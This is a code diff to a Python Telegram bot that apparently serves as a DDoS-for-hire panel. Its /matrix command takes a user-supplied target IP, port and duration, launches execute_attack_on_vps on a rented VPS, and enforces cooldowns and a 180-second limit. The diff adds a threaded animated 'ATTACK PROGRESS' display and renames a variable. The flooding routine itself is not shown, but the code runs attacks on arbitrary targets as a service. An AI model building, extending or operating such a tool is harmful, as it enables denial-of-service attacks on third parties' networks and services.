@@ -914,6 +914,52 @@ def check_cooldown(user_id):
     return True, 0
 
 # Modified matrix handler with cooldown implementation
+import time
+from datetime import datetime, timedelta
+
+# Add this function to create an animated progress bar with 1% accuracy
+def send_animated_progress(bot, message, vps, target, port, attack_duration, end_time):
+    user_id = str(message.chat.id)
+    start_time = datetime.now(IST)
+    
+    # Define the animation frames
+    animation_frames = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]
+    frame_index = 0
+    
+    # Define the progress bar length
+    progress_bar_length = 20  # Number of characters in the progress bar
+    
+    while datetime.now(IST) < end_time:
+        remaining_time = (end_time - datetime.now(IST)).total_seconds()
+        progress_percentage = ((attack_duration - remaining_time) / attack_duration) * 100
+        
+        # Ensure progress_percentage is between 0 and 100
+        progress_percentage = max(0, min(100, progress_percentage))
+        
+        # Calculate the filled length of the progress bar
+        filled_length = int(progress_bar_length * (progress_percentage / 100))
+        
+        # Create the animated progress bar
+        progress_bar = "█" * filled_length + animation_frames[frame_index] + " " * (progress_bar_length - filled_length)
+        
+        # Update the animation frame
+        frame_index = (frame_index + 1) % len(animation_frames)
+        
+        # Build the progress message
+        progress_message = f"""🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
+🔌 𝗣𝗼𝗿𝘁: {port}
+⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗧𝗶𝗺𝗲: {int(remaining_time)} seconds
+📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: [{progress_bar}] {progress_percentage:.1f}%"""
+
+        try:
+            bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text=progress_message)
+        except Exception as e:
+            logging.error(f"Failed to update progress: {e}")
+        
+        time.sleep(1)  # Update every 1 second for smoother animation
+
+# Modify the /matrix command handler to include animated progress updates
 @bot.message_handler(commands=['matrix'])
 def handle_matrix(message):
     user_id = str(message.chat.id)
@@ -952,10 +998,10 @@ def handle_matrix(message):
     try:
         target = args[1]
         port = int(args[2])
-        time = int(args[3])
+        time_attack = int(args[3])
         current_time = datetime.now(IST)
 
-        if time > 180:
+        if time_attack > 180:
             bot.reply_to(message, "⚠️ Maximum attack time is 180 seconds.")
             return
 
@@ -981,7 +1027,7 @@ def handle_matrix(message):
 🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
-⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
 💻 𝗩𝗣𝗦: {vps['host']}
 
 ⏰ 𝗧𝗶𝗺𝗲𝘀𝘁𝗮𝗺𝗽: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
@@ -994,12 +1040,20 @@ def handle_matrix(message):
         launch_msg = bot.reply_to(message, f"""🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
-⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
 ⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack in progress...""")
-                
+
+        # Calculate the end time of the attack
+        end_time = datetime.now(IST) + timedelta(seconds=time_attack)
+
+        # Start a thread to send animated progress updates
+        progress_thread = threading.Thread(target=send_animated_progress, args=(bot, launch_msg, vps, target, port, time_attack, end_time))
+        progress_thread.daemon = True
+        progress_thread.start()
+
         def attack_callback():
             try:
-                result = execute_attack_on_vps(vps, target, port, time)
+                result = execute_attack_on_vps(vps, target, port, time_attack)
                 if user_id not in admin_owner:
                     user_cooldowns[user_id] = datetime.now(IST)
                 bot.reply_to(message, result)
@@ -1010,7 +1064,7 @@ def handle_matrix(message):
 🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
-⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
 💻 𝗩𝗣𝗦: {vps['host']}
 📊 𝗩𝗣𝗦 𝗟𝗼𝗮𝗱: {vps['active_attacks']}/{vps['max_attacks']}
 ⏰ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {completion_time.strftime('%Y-%m-%d %H:%M:%S')} IST"""
